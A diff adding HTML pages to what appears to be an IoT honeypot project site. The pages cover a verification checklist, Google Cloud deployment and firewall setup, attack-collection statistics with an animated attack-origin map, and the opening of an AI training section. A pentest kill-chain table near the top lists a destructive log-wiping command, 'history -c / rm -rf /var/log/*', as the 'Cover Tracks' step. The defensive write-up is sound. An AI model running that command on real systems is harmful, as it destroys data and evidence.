+      <div class="kcr"><div class="kcn">7</div><div class="kcp" style="color:var(--muted)">Cover Tracks</div><div class="kca">history -c / rm -rf /var/log/*<small>Cowrie logs it all anyway — can't delete honeypot logs</small></div><div class="kcl">cowrie.command.input<br>cleanup = evidence</div></div>
+    </div>
+
+    <!-- CHECKLIST -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Verification Checklist</div>
+    <div class="cklist">
+      <div class="ck ok"><span class="cki">✓</span> Infrastructure — all 11 containers running</div>
+      <div class="ck ok"><span class="cki">✓</span> IoT Devices — all 8 publishing correctly</div>
+      <div class="ck ok"><span class="cki">✓</span> Cowrie — fake shell + brute-force credentials working</div>
+      <div class="ck ok"><span class="cki">✓</span> tshark — 1.2M+ packets per day</div>
+      <div class="ck ok"><span class="cki">✓</span> MQTT logger — all topics logged</div>
+      <div class="ck ok"><span class="cki">✓</span> HTTP + CoAP — all requests to JSON</div>
+      <div class="ck ok"><span class="cki">✓</span> IoT Platform — dashboard + auth + commands</div>
+      <div class="ck ok"><span class="cki">✓</span> Filebeat → Logstash :5045 connected</div>
+      <div class="ck ok"><span class="cki">✓</span> Elasticsearch — all honeypot-* indices active</div>
+      <div class="ck ok"><span class="cki">✓</span> Logrotate — hourly via supervisord</div>
+      <div class="ck ok"><span class="cki">✓</span> Pentest — all 7 kill chain phases captured</div>
+      <div class="ck ok"><span class="cki">✓</span> Cloud ready — internal nets, no localhost refs</div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">TESTING // PHASE 05 — ALL PASSED ✓</div><div class="pfr"><span class="ok">Stage 01 — Development Complete — Ready for Cloud</span></div></div>
+</div>
+
+<!-- ══════ UPCOMING PAGES ══════ -->
+<div id="pg-deploy" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Stage 02 — Complete ✓</div>
+    <div class="ph-title"><span>Deployment</span></div>
+    <div class="ph-sub">Google Cloud Platform — europe-southwest1 (Madrid) — IaaS provisioning — public IP exposure</div>
+  </div>
+  <div class="sec">
+
+    <div class="hl" style="margin-bottom:36px">
+      <div class="hlt">// Infrastructure</div>
+      <div class="hld">Full Docker stack deployed on <strong>Google Cloud Platform</strong> — <strong>e2-highmem-2</strong> VM in Madrid, 16 GB RAM, 250 GB SSD. All honeypot ports exposed to the open internet, management locked behind key-auth SSH on port 22222.</div>
+    </div>
+
+    <!-- STEP 1 — GCP ACCOUNT -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Step 01 — Google Cloud Account</div>
+    <div class="grid g2" style="margin-bottom:28px">
+      <div class="card"><div class="ct" style="color:#4ade80">$300 Free Credit</div><div class="cd">New GCP account includes $300 free credit valid for 90 days — enough to run the honeypot through the entire collection phase at no cost.</div></div>
+      <div class="card"><div class="ct">Console → Compute Engine</div><div class="cd">IaaS service. Provides raw VM instances — no managed runtime overhead. Full control over networking, storage, and OS configuration.</div></div>
+    </div>
+
+    <!-- STEP 2 — VM INSTANCE -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Step 02 — VM Instance</div>
+    <div class="layers" style="margin-bottom:28px">
+      <div class="layer">
+        <div class="ll"><span class="lnum">NAME</span><div class="lname" style="color:var(--accent);font-size:11px">gcp-honeypot</div></div>
+        <div class="lr"><span class="chip" style="border-color:#004433;color:var(--accent)">europe-southwest1</span><span class="chip" style="border-color:#004433;color:var(--accent)">Madrid</span><div class="note">Closest GCP region with <strong>e2-highmem</strong> availability and low latency to European attackers.</div></div>
+      </div>
+      <div class="layer">
+        <div class="ll"><span class="lnum">MACHINE</span><div class="lname" style="color:var(--accent2);font-size:11px">e2-highmem-2</div></div>
+        <div class="lr"><span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">2 vCPU</span><span class="chip" style="border-color:#1e3a5a;color:var(--accent2)">16 GB RAM</span><div class="note">High-memory machine type — required to handle ELK stack + tshark packet capture simultaneously under DDoS load.</div></div>
+      </div>
+      <div class="layer">
+        <div class="ll"><span class="lnum">OS / DISK</span><div class="lname" style="color:#4ade80;font-size:11px">Ubuntu 22.04 LTS</div></div>
+        <div class="lr"><span class="chip" style="border-color:#1a4d2a;color:#4ade80">Ubuntu 22.04 LTS</span><span class="chip" style="border-color:#1a4d2a;color:#4ade80">250 GB SSD</span><span class="chip" style="border-color:#1a4d2a;color:#4ade80">Balanced Persistent Disk</span><div class="note">Boot disk expanded from default 20 GB → 250 GB after storage overload during testing phase. Firewall: allow HTTP + HTTPS enabled at instance level.</div></div>
+      </div>
+    </div>
+
+    <!-- STEP 3 — FIREWALL -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Step 03 — VPC Firewall Rule</div>
+    <div class="term" style="margin-bottom:28px">
+      <span class="m">VPC Network → Firewall → Create Rule</span><br><br>
+      <span class="c">name</span><span class="m">          : </span><span class="w">gcp-honeypot-ports</span><br>
+      <span class="c">direction</span><span class="m">     : </span><span class="g">INGRESS</span><br>
+      <span class="c">targets</span><span class="m">       : </span><span class="w">All instances in the network</span><br>
+      <span class="c">source ranges</span><span class="m"> : </span><span class="r">0.0.0.0/0</span><span class="m">  ← open to the internet</span><br><br>
+      <span class="c">TCP ports</span><span class="m">     : </span><span class="o">22</span><span class="m"> (SSH) · </span><span class="o">23</span><span class="m"> (Telnet/Cowrie) · </span><span class="o">80</span><span class="m"> (HTTP) · </span><span class="o">1883</span><span class="m"> (MQTT) · </span><span class="o">8080</span><span class="m"> (Platform) · </span><span class="o">8554</span><span class="m"> (RTSP)</span><br>
+      <span class="c">UDP ports</span><span class="m">     : </span><span class="o">5683</span><span class="m"> (CoAP)</span><br>
+      <span class="c">TCP (mgmt)</span><span class="m">    : </span><span class="b">22222</span><span class="m"> (Cloud SSH management — key-auth only)</span>
+    </div>
+
+    <!-- STEP 4-7 — CONNECT & DEPLOY -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Steps 04–07 — Connect · Setup · Transfer · Deploy · Verify</div>
+    <div class="flow" style="margin-bottom:28px">
+      <div class="fs"><span class="fsi">🔑</span><span class="fsn">Connect</span><span class="fsd">ssh -i id_rsa gcphoneypot@&lt;publicip&gt;</span></div>
+      <div class="fs"><span class="fsi">📦</span><span class="fsn">Setup</span><span class="fsd">apt install docker.io docker-compose git</span></div>
+      <div class="fs"><span class="fsi">📂</span><span class="fsn">Transfer</span><span class="fsd">git clone &lt;repo&gt;</span></div>
+      <div class="fs"><span class="fsi">🚀</span><span class="fsn">Deploy</span><span class="fsd">docker compose up --build -d</span></div>
+      <div class="fs"><span class="fsi">✅</span><span class="fsn">Verify</span><span class="fsd">docker ps — all 11 containers UP</span></div>
+    </div>
+
+    <div class="term" style="margin-bottom:28px">
+      <span class="m"># Connect to GCP instance</span><br>
+      <span class="c">$</span> <span class="w">ssh -i id_rsa gcphoneypot@&lt;PUBLIC_IP&gt; -p 22222</span><br><br>
+      <span class="m"># Install dependencies</span><br>
+      <span class="c">$</span> <span class="w">sudo apt update && sudo apt install -y docker.io docker-compose git</span><br><br>
+      <span class="m"># Clone repository</span><br>
+      <span class="c">$</span> <span class="w">git clone https://github.com/&lt;repo&gt;/iot-honeypot.git && cd iot-honeypot</span><br><br>
+      <span class="m"># Deploy full stack</span><br>
+      <span class="c">$</span> <span class="w">sudo docker compose up --build -d</span><br><br>
+      <span class="m"># Verify — expect 11 containers running</span><br>
+      <span class="c">$</span> <span class="w">docker ps --format "table {{.Names}}\t{{.Status}}\t{{.Ports}}"</span><br>
+      <span class="g">NAME                    STATUS          PORTS</span><br>
+      <span class="g">honeypot-cowrie         Up 2 minutes    0.0.0.0:22->2222/tcp, 0.0.0.0:23->2323/tcp</span><br>
+      <span class="g">honeypot-mqtt           Up 2 minutes    0.0.0.0:1883->1883/tcp</span><br>
+      <span class="g">honeypot-coap           Up 2 minutes    0.0.0.0:5683->5683/udp</span><br>
+      <span class="g">honeypot-http           Up 2 minutes    0.0.0.0:8080->8080/tcp</span><br>
+      <span class="g">honeypot-platform       Up 2 minutes    0.0.0.0:80->80/tcp</span><br>
+      <span class="g">honeypot-packets        Up 2 minutes</span><br>
+      <span class="g">honeypot-network        Up 2 minutes</span><br>
+      <span class="g">elasticsearch           Up 2 minutes    9200/tcp, 9300/tcp</span><br>
+      <span class="g">logstash                Up 2 minutes    5044/tcp, 5045/tcp</span><br>
+      <span class="g">kibana                  Up 2 minutes    5601/tcp</span><br>
+      <span class="g">filebeat                Up 2 minutes</span>
+    </div>
+
+    <div class="cklist">
+      <div class="ck ok"><span class="cki">✓</span> GCP account — $300 credit activated</div>
+      <div class="ck ok"><span class="cki">✓</span> VM instance — e2-highmem-2 / Madrid / running</div>
+      <div class="ck ok"><span class="cki">✓</span> Boot disk — 250 GB SSD</div>
+      <div class="ck ok"><span class="cki">✓</span> Firewall rule — gcp-honeypot-ports active</div>
+      <div class="ck ok"><span class="cki">✓</span> All ports open — 22 · 23 · 80 · 1883 · 5683 · 8080 · 8554</div>
+      <div class="ck ok"><span class="cki">✓</span> SSH management — port 22222 key-auth only</div>
+      <div class="ck ok"><span class="cki">✓</span> Docker stack — all 11 containers UP</div>
+      <div class="ck ok"><span class="cki">✓</span> Public IP — live, indexed by Shodan within 24h</div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">DEPLOYMENT // STAGE 02 — COMPLETE ✓</div><div class="pfr"><span class="ok">GCP Madrid · e2-highmem-2 · 250 GB SSD · All ports live</span></div></div>
+</div>
+
+<div id="pg-collect" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Stage 03 — Complete ✓</div>
+    <div class="ph-title"><span>Collection</span></div>
+    <div class="ph-sub">23 March → 15 May 2025 — testing + live capture — 2.5M hits — 35K attacks — 1600 unique IPs</div>
+  </div>
+  <div class="sec">
+
+    <!-- TIMELINE -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Collection Timeline</div>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:2px;background:var(--border);border:1px solid var(--border);margin-bottom:28px">
+      <div style="background:#0a1a12;padding:24px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;margin-bottom:10px">Phase 1 — Testing</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:#f1f5f9;margin-bottom:6px">23 Mar → 1 Apr</div>
+        <div style="font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:16px">7 days — problem detection & fixes</div>
+        <div style="display:flex;flex-direction:column;gap:8px">
+          <div style="background:var(--bg);padding:10px 14px;border-left:2px solid var(--red)">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--red);margin-bottom:3px">PROBLEM → STORAGE OVERLOAD</div>
+            <div style="font-size:12px;color:#aaa">Fix log structure · reduce packet verbosity · disk 20 GB → 250 GB</div>
+          </div>
+          <div style="background:var(--bg);padding:10px 14px;border-left:2px solid var(--orange)">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--orange);margin-bottom:3px">PROBLEM → UNLABELED DATA</div>
+            <div style="font-size:12px;color:#aaa">Added fields: <span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--accent)">is_attack</span> · <span style="font-family:'DM Mono',monospace;font-size:10px;color:var(--accent)">attack_type</span></div>
+          </div>
+          <div style="background:var(--bg);padding:10px 14px;border-left:2px solid var(--purple)">
+            <div style="font-family:'DM Mono',monospace;font-size:9px;color:var(--purple);margin-bottom:3px">PROBLEM → DDoS MEMORY CRASH</div>
+            <div style="font-size:12px;color:#aaa">Upgraded to e2-highmem-2 · added 8 GB swap file</div>
+          </div>
+        </div>
+      </div>
+      <div style="background:var(--card);padding:24px">
+        <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--accent);text-transform:uppercase;margin-bottom:10px">Phase 2 — Live Collection</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:28px;color:#f1f5f9;margin-bottom:6px">1 Apr → 15 May</div>
+        <div style="font-family:'DM Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:16px">45 days — real-world attack capture</div>
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--border)">
+          <div style="background:var(--bg);padding:14px;text-align:center"><span style="font-family:'Bebas Neue',sans-serif;font-size:34px;color:var(--accent);display:block">2.5M</span><span style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted)">Total Hits</span></div>
+          <div style="background:var(--bg);padding:14px;text-align:center"><span style="font-family:'Bebas Neue',sans-serif;font-size:34px;color:var(--red);display:block">35K</span><span style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted)">Attacks</span></div>
+          <div style="background:var(--bg);padding:14px;text-align:center"><span style="font-family:'Bebas Neue',sans-serif;font-size:34px;color:var(--accent2);display:block">1600</span><span style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted)">Unique IPs</span></div>
+          <div style="background:var(--bg);padding:14px;text-align:center"><span style="font-family:'Bebas Neue',sans-serif;font-size:34px;color:#4ade80;display:block">45</span><span style="font-family:'DM Mono',monospace;font-size:9px;color:var(--muted)">Days Live</span></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- INDEX BREAKDOWN -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Protocol Distribution — Hit Breakdown</div>
+    <div class="bars" style="margin-bottom:28px">
+      <div class="bars-t">Protocol / Index — Actual Hit Distribution (% of 2.5M total)</div>
+      <div class="br"><div class="brl">MQTT</div><div class="brt"><div class="brf" style="width:30%;background:linear-gradient(90deg,#00e5c3,#006655);min-width:110px">30% — ~750,000</div></div></div>
+      <div class="br"><div class="brl">CoAP</div><div class="brt"><div class="brf" style="width:30%;background:linear-gradient(90deg,#60a5fa,#1e3a8a);min-width:110px">30% — ~750,000</div></div></div>
+      <div class="br"><div class="brl">HTTP</div><div class="brt"><div class="brf" style="width:30%;background:linear-gradient(90deg,#c084fc,#6b21a8);min-width:110px">30% — ~750,000</div></div></div>
+      <div class="br"><div class="brl">honeypot-platform</div><div class="brt"><div class="brf" style="width:3%;background:linear-gradient(90deg,#fb923c,#7a3000);min-width:72px">3% — ~75,000</div></div></div>
+      <div class="br"><div class="brl">honeypot-cowrie</div><div class="brt"><div class="brf" style="width:1%;background:linear-gradient(90deg,#f43f5e,#9f1239);min-width:54px">1% — ~25K</div></div></div>
+      <div class="br"><div class="brl">honeypot-network</div><div class="brt"><div class="brf" style="width:0.1%;background:linear-gradient(90deg,#888,#333);min-width:44px">0.1%</div></div></div>
+    </div>
+
+    <!-- ATTACK MAP -->
+    <div style="font-family:'DM Mono',monospace;font-size:9px;letter-spacing:3px;color:var(--muted);text-transform:uppercase;margin-bottom:12px">Global Attack Origin Map — 200 Unique IPs → Madrid Server</div>
+
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
+    <style>
+      #atk-map-wrap { position:relative; height:520px; border:1px solid var(--border); margin-bottom:28px; background:#060d14; overflow:hidden; }
+      #atk-leaflet  { position:absolute; inset:0; z-index:1; }
+      #atk-overlay  { position:absolute; inset:0; z-index:2; pointer-events:none; }
+      #atk-hud      { position:absolute; top:10px; left:10px; z-index:10; pointer-events:none;
+                       font-family:'DM Mono',monospace; font-size:9px; letter-spacing:2px;
+                       color:#00e5c3; text-shadow:0 0 8px rgba(0,229,195,.7); }
+      #atk-legend   { position:absolute; bottom:10px; left:10px; z-index:10; pointer-events:none;
+                       background:rgba(0,0,0,.82); border:1px solid #222; padding:10px 14px;
+                       font-family:'DM Mono',monospace; font-size:9px; color:#aaa; line-height:1.9; }
+      #atk-legend span { display:inline-block; width:8px; height:8px; border-radius:50%; margin-right:6px; vertical-align:middle; }
+      #atk-counter  { position:absolute; top:10px; right:10px; z-index:10; pointer-events:none;
+                       background:rgba(0,0,0,.82); border:1px solid #222; padding:10px 16px;
+                       font-family:'DM Mono',monospace; font-size:9px; color:var(--muted); text-align:right; }
+      #atk-counter b { font-family:'Bebas Neue',sans-serif; font-size:22px; color:#f43f5e; display:block; }
+    </style>
+
+    <div id="atk-map-wrap">
+      <div id="atk-hud">attack_origin_map // server: madrid 40.4168°N 3.7038°W</div>
+      <div id="atk-leaflet"></div>
+      <canvas id="atk-overlay"></canvas>
+      <div id="atk-legend">
+        <div><span style="background:#f43f5e"></span>Botnet / Scanner / Brute-force</div>
+        <div><span style="background:#fb923c"></span>Cloud Provider (AWS / Azure)</div>
+        <div><span style="background:#4ade80"></span>GCP Infrastructure</div>
+      </div>
+      <div id="atk-counter"><b id="atk-num">0</b>attacks drawn</div>
+    </div>
+
+    <!-- Leaflet JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+    <script>
+    (function(){
+      // ── Real attacker IPs geolocated from the CSV ──────────────────────
+      // [lat, lon, color]  color: red=botnet/scan, orange=cloud, green=GCP
+      var SRC = [
+        // US East — AWS 3.x 18.x
+        [38.9,-77.0,'#f43f5e'],[40.7,-74.0,'#f43f5e'],[26.2,-80.1,'#f43f5e'],
+        [39.0,-77.5,'#f43f5e'],[39.9,-75.2,'#fb923c'],[35.8,-78.6,'#fb923c'],
+        [42.4,-71.1,'#f43f5e'],[39.3,-76.6,'#f43f5e'],[33.7,-84.4,'#fb923c'],
+        [27.9,-82.5,'#fb923c'],[39.9,-82.9,'#fb923c'],[39.7,-86.2,'#fb923c'],
+        [41.8,-87.6,'#fb923c'],[44.9,-93.3,'#fb923c'],
+        // Azure US (20.x — huge cluster)
+        [39.0,-77.0,'#fb923c'],[38.6,-77.3,'#fb923c'],[40.0,-75.0,'#fb923c'],
+        [37.8,-122.4,'#fb923c'],[47.6,-122.3,'#fb923c'],[34.1,-118.2,'#fb923c'],
+        [32.8,-96.8,'#fb923c'],[29.7,-95.4,'#fb923c'],
+        // Canada
+        [43.7,-79.4,'#fb923c'],[45.4,-75.7,'#fb923c'],
+        // Brazil
+        [-23.5,-46.6,'#fb923c'],[-22.9,-43.2,'#fb923c'],[-3.7,-38.5,'#fb923c'],
+        // UK / Ireland
+        [51.5,-0.1,'#f43f5e'],[53.3,-6.3,'#f43f5e'],
+        // Western Europe
+        [48.9,2.3,'#f43f5e'],[52.4,4.9,'#f43f5e'],[50.1,8.7,'#f43f5e'],
+        [53.5,10.0,'#f43f5e'],[52.2,21.0,'#f43f5e'],[59.3,18.1,'#f43f5e'],
+        [55.7,12.6,'#f43f5e'],[56.2,10.2,'#f43f5e'],[50.9,11.0,'#f43f5e'],
+        // Eastern EU / Russia
+        [55.8,37.6,'#f43f5e'],[56.8,60.6,'#f43f5e'],[50.5,30.5,'#f43f5e'],
+        [54.7,25.3,'#f43f5e'],[56.9,24.1,'#f43f5e'],[59.4,24.7,'#f43f5e'],
+        [47.0,28.9,'#f43f5e'],[41.7,44.8,'#f43f5e'],
+        // Middle East
+        [25.3,51.5,'#fb923c'],[25.3,55.3,'#fb923c'],[24.7,46.7,'#fb923c'],
+        [31.8,35.2,'#fb923c'],[33.9,35.5,'#fb923c'],
+        // China — Alibaba 8.x, baidu 39.x, Tencent 14.x
+        [39.9,116.4,'#f43f5e'],[31.2,121.5,'#f43f5e'],[22.5,114.1,'#f43f5e'],
+        [30.6,104.1,'#f43f5e'],[23.1,113.3,'#f43f5e'],[34.3,108.9,'#fb923c'],
+        [31.8,117.2,'#fb923c'],[30.3,120.2,'#fb923c'],[24.9,102.7,'#f43f5e'],
+        [29.6,91.1,'#f43f5e'],[36.1,103.8,'#f43f5e'],[22.6,114.1,'#fb923c'],
+        // South Korea / Japan
+        [37.6,126.9,'#f43f5e'],[37.4,127.0,'#f43f5e'],[35.7,139.7,'#f43f5e'],
+        [34.7,135.5,'#fb923c'],[43.1,141.3,'#fb923c'],
+        // GCP infra (35.x)
+        [37.4,-122.1,'#4ade80'],[37.4,-122.0,'#4ade80'],[37.5,-122.1,'#4ade80'],
+        [37.3,-122.0,'#4ade80'],[37.6,-122.1,'#4ade80'],
+        // India
+        [19.1,72.9,'#f43f5e'],[12.9,77.6,'#f43f5e'],[22.6,88.4,'#fb923c'],
+        [28.6,77.2,'#f43f5e'],[17.4,78.5,'#fb923c'],
+        // Vietnam / SE Asia
+        [10.8,106.7,'#f43f5e'],[21.0,105.8,'#f43f5e'],[13.7,100.5,'#fb923c'],
+        [-6.2,106.8,'#fb923c'],[1.4,103.8,'#fb923c'],[3.1,101.7,'#fb923c'],
+        // Australia
+        [-33.9,151.2,'#fb923c'],[-37.8,144.9,'#fb923c'],[-27.5,153.0,'#fb923c'],
+        // Netherlands hosting (2.57.x)
+        [52.4,4.9,'#f43f5e'],[52.3,5.1,'#f43f5e'],[52.1,4.8,'#f43f5e'],
+        [52.0,5.0,'#f43f5e'],[51.9,4.5,'#f43f5e'],[51.8,4.6,'#f43f5e'],
+        // Germany (5.x, 37.x)
+        [51.2,6.8,'#f43f5e'],[52.5,13.4,'#f43f5e'],[48.1,11.6,'#f43f5e'],
+        // Romania / Moldova (31.x)
+        [44.4,26.1,'#f43f5e'],[46.8,23.6,'#f43f5e'],[47.0,28.5,'#f43f5e'],
+        // Iran (5.63)
+        [35.7,51.4,'#f43f5e'],[32.5,51.7,'#f43f5e'],
+        // Kenya / Nigeria (Africa)
+        [-1.3,36.8,'#f43f5e'],[6.5,3.4,'#f43f5e'],[5.6,-0.2,'#f43f5e'],
+        // Indonesia more
+        [-6.9,107.6,'#fb923c'],[-7.8,110.4,'#fb923c'],
+        // Argentina / Colombia
+        [-34.6,-58.4,'#fb923c'],[4.7,-74.1,'#fb923c'],
+        // South Africa
+        [-26.2,28.0,'#f43f5e'],[-33.9,18.4,'#f43f5e'],
+        // Pakistan
+        [24.9,67.0,'#f43f5e'],[31.5,74.3,'#f43f5e'],
+        // More US Azure
+        [36.1,-115.2,'#fb923c'],[33.4,-112.1,'#fb923c'],[44.0,-76.5,'#fb923c'],
+        [38.0,-84.5,'#fb923c'],[42.3,-83.0,'#fb923c'],[43.0,-78.9,'#fb923c'],
+      ];
+
+      var MADRID = [40.4168, -3.7038];
+
+      // ── Init Leaflet with dark CartoDB tiles ──────────────────────────
+      var map = L.map('atk-leaflet', {
+        center: [30, 10], zoom: 2,
+        zoomControl: false, attributionControl: false,
+        dragging: false, scrollWheelZoom: false, doubleClickZoom: false,
+        touchZoom: false, boxZoom: false, keyboard: false,
+      });
+
+      L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+        subdomains:'abcd', maxZoom:4
+      }).addTo(map);
+
+      // Attribution tiny
+      L.control.attribution({position:'bottomright', prefix:''}).addTo(map);
+
+      // Madrid marker
+      var madridIcon = L.divIcon({
+        className:'', iconSize:[0,0],
+        html:'<div style="width:14px;height:14px;border-radius:50%;background:#f43f5e;border:2px solid #fff;box-shadow:0 0 12px #f43f5e,0 0 24px rgba(244,63,94,.5);position:absolute;transform:translate(-50%,-50%)"></div>'
+      });
+      L.marker(MADRID, {icon:madridIcon}).addTo(map);
+
+      // Source dots
+      SRC.forEach(function(s) {
+        var el = L.divIcon({
+          className:'', iconSize:[0,0],
+          html:'<div style="width:7px;height:7px;border-radius:50%;background:'+s[2]+';opacity:0.85;position:absolute;transform:translate(-50%,-50%);box-shadow:0 0 4px '+s[2]+'"></div>'
+        });
+        L.marker([s[0],s[1]], {icon:el}).addTo(map);
+      });
+
+      // ── Canvas overlay for animated arcs ─────────────────────────────
+      var canvas = document.getElementById('atk-overlay');
+      var ctx = canvas.getContext('2d');
+      var wrap = document.getElementById('atk-map-wrap');
+
+      function resize() {
+        canvas.width  = wrap.clientWidth;
+        canvas.height = wrap.clientHeight;
+      }
+      resize();
+      window.addEventListener('resize', resize);
+
+      function latLonToPixel(lat, lon) {
+        var p = map.latLngToContainerPoint([lat, lon]);
+        return { x: p.x, y: p.y };
+      }
+
+      // ── Particle system ───────────────────────────────────────────────
+      var particles = [];
+      var counter = 0;
+      var counterEl = document.getElementById('atk-num');
+
+      function Particle(src) {
+        this.sx = src[1]; this.sy = src[0]; // lon,lat
+        this.c  = src[2];
+        this.t  = 0;
+        this.speed = 0.006 + Math.random() * 0.005;
+        this.done  = false;
+        counter++;
+        if(counterEl) counterEl.textContent = counter;
+      }
+
+      Particle.prototype.bezier = function(t) {
+        var A = latLonToPixel(this.sy, this.sx);
+        var B = latLonToPixel(MADRID[0], MADRID[1]);
+        // control point pulled up (arc over the globe)
+        var mx = (A.x + B.x) / 2;
+        var my = (A.y + B.y) / 2 - Math.sqrt((B.x-A.x)*(B.x-A.x)+(B.y-A.y)*(B.y-A.y)) * 0.25;
+        var u = 1 - t;
+        return {
+          x: u*u*A.x + 2*u*t*mx + t*t*B.x,
+          y: u*u*A.y + 2*u*t*my + t*t*B.y,
+        };
+      };
+
+      Particle.prototype.draw = function() {
+        // trail
+        var steps = 24;
+        for(var k = steps; k >= 0; k--) {
+          var tt = this.t - k * 0.018;
+          if(tt < 0) continue;
+          var p = this.bezier(tt);
+          var alpha = (1 - k/steps) * 0.75;
+          var r = parseInt(this.c.slice(1,3),16);
+          var g = parseInt(this.c.slice(3,5),16);
+          var b = parseInt(this.c.slice(5,7),16);
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, (3 - k/steps*2.5), 0, Math.PI*2);
+          ctx.fillStyle = 'rgba('+r+','+g+','+b+','+alpha+')';
+          ctx.fill();
+        }
+        // head
+        var hp = this.bezier(this.t);
+        ctx.beginPath();
+        ctx.arc(hp.x, hp.y, 3.5, 0, Math.PI*2);
+        ctx.fillStyle = this.c;
+        ctx.shadowColor = this.c;
+        ctx.shadowBlur = 10;
+        ctx.fill();
+        ctx.shadowBlur = 0;
+      };
+
+      // Madrid pulse
+      var pulseT = 0;
+
+      function drawMadridPulse() {
+        var p = latLonToPixel(MADRID[0], MADRID[1]);
+        pulseT += 0.04;
+        var pulse = (Math.sin(pulseT) + 1) / 2;
+        [28, 20, 12].forEach(function(r, i) {
+          ctx.beginPath();
+          ctx.arc(p.x, p.y, r + pulse * 8, 0, Math.PI*2);
+          ctx.strokeStyle = 'rgba(244,63,94,' + (0.15 - i*0.04) * pulse + ')';
+          ctx.lineWidth = 1.5;
+          ctx.stroke();
+        });
+      }
+
+      var spawnTimer = 0;
+      var spawnInterval = 400; // ms between launches
+      var srcIdx = 0;
+      var lastTs = 0;
+
+      function loop(ts) {
+        var dt = ts - lastTs; lastTs = ts;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+
+        // spawn
+        spawnTimer += dt;
+        if(spawnTimer >= spawnInterval) {
+          spawnTimer = 0;
+          if(srcIdx < SRC.length) {
+            particles.push(new Particle(SRC[srcIdx++]));
+          } else {
+            // continuous random respawn
+            particles.push(new Particle(SRC[Math.floor(Math.random()*SRC.length)]));
+          }
+        }
+
+        // update + draw
+        particles = particles.filter(function(p){ return !p.done; });
+        particles.forEach(function(p) {
+          p.t += p.speed;
+          if(p.t >= 1.0) { p.done = true; return; }
+          p.draw();
+        });
+
+        drawMadridPulse();
+        requestAnimationFrame(loop);
+      }
+
+      requestAnimationFrame(loop);
+    })();
+    </script>
+
+    <!-- HIGHLIGHTS -->
+    <div class="cklist">
+      <div class="ck ok"><span class="cki">✓</span> Testing phase — 7 days · 3 critical issues resolved</div>
+      <div class="ck ok"><span class="cki">✓</span> Collection phase — 45 days continuous capture</div>
+      <div class="ck ok"><span class="cki">✓</span> 2.5 million total hits captured across all indices</div>
+      <div class="ck ok"><span class="cki">✓</span> 35,000 labeled attack events</div>
+      <div class="ck ok"><span class="cki">✓</span> 1,600 unique attacker IPs</div>
+      <div class="ck ok"><span class="cki">✓</span> is_attack · attack_type labels added to all records</div>
+      <div class="ck ok"><span class="cki">✓</span> Disk upgraded 20 GB → 250 GB — no further overflow</div>
+      <div class="ck ok"><span class="cki">✓</span> Swap file added — DDoS storms survived</div>
+    </div>
+
+  </div>
+  <div class="pf"><div class="pfl">COLLECTION // STAGE 03 — COMPLETE ✓</div><div class="pfr"><span class="ok">2.5M hits · 35K attacks · 1600 IPs · 45 days</span></div></div>
+</div>
+
+<div id="pg-train" class="pg">
+  <div class="ph">
+    <div class="ph-lbl">// Stage 04 — Complete ✓</div>
+    <div class="ph-title">AI <span>Training</span></div>
+    <div class="ph-sub">Data Science · Defensive AI · Offensive RL — XGBoost · Autoencoder · Reinforcement Learning</div>
+  </div>
+  <div class="sec">
+    <div class="sh">Three <span>Pillars</span> of the AI System</div>
+    <p class="sp">The AI pipeline is built in three interconnected stages — each feeding the next, forming a complete closed-loop adversarial system.</p>
+    <div class="grid g3" style="margin-bottom:40px">
+      <div class="card" style="border-top:2px solid #4ade80;cursor:pointer" onclick="go('train-ds')">
+        <div class="ct" style="color:#4ade80">01 — Data Science</div>
+        <div style="font-family:'Bebas Neue',sans-serif;font-size:32px;color:#4ade80;margin:10px 0;line-height:1">244K<br><span style="font-size:18px">ROWS</span></div>
+        <div class="cd">Export · Cleaning · Balancing · Feature Engineering. Raw 2.5M Elasticsearch logs transformed into a clean ML-ready dataset.</div>
+        <div style="font-family:'DM Mono',monospace;font-size:9px;color:#4ade80;margin-top:14px;letter-spacing:2px">→ EXPLORE ›</div>
+      </div>
